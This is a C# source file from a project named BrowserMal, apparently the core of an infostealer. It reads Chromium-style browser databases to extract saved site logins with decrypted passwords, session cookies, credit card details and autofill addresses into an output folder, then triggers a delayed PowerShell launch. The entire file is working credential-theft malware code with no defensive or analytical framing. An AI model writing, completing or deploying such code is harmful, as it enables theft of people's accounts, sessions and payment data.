using BrowserMal.Browser;
using System.Collections.Generic;
using BrowserMal.Manager;
using BrowserMal.Model;

namespace BrowserMal
{
    public class Class1
    {
        private static readonly BrowserManager browserManager = new BrowserManager();

        public static void Start(string outputPath)
        {
            browserManager.Init();
            List<BrowserModel> browsers = browserManager.GetBrowsers();

            List<ColumnModel> credsColumns = new List<ColumnModel>
            {
                new ColumnModel("origin_url", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("username_value", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("password_value", isEncrypted: true, needsFormatting: false, isImportant: true)
            };
            new GenericManager<CredentialModel>("logins", new SqliteTableModel(credsColumns)).Init(ref browsers, Browser.Util.LOGIN_DATA, outputPath);

            List<ColumnModel> cookiesColumns = new List<ColumnModel>
            {
                new ColumnModel("host_key", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("name", isEncrypted: false, needsFormatting: false, isImportant: true),
                new ColumnModel("path", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("expires_utc", isEncrypted: false, needsFormatting: true, isImportant: false, Browser.Util.ChromiumToUnixTimestamp),
                new ColumnModel("encrypted_value", isEncrypted: true, needsFormatting: false, isImportant: true)
            };
            new GenericManager<CookieModel>("cookies", new SqliteTableModel(cookiesColumns)).Init(ref browsers, Browser.Util.COOKIES, outputPath);

            List<ColumnModel> creditCardsColumns = new List<ColumnModel>()
            {
                new ColumnModel("name_on_card", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("expiration_month", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("expiration_year", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("nickname", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("card_number_encrypted", isEncrypted: true, needsFormatting: false, isImportant: false)
            };
            new GenericManager<CreditCardModel>("credit_cards", new SqliteTableModel(creditCardsColumns)).Init(ref browsers, Browser.Util.WEB_DATA, outputPath);

            List<ColumnModel> addressesColumns = new List<ColumnModel>()
            {
                new ColumnModel("street_address", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("city", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("zipcode", isEncrypted: false, needsFormatting: false, isImportant: false)
            };
            new GenericManager<AddressesModel>("autofill_profiles", new SqliteTableModel(addressesColumns)).Init(ref browsers, Browser.Util.WEB_DATA, outputPath);

            Util.ProcessUtil.RunAfterSeconds("powershel");
        }
    }
}
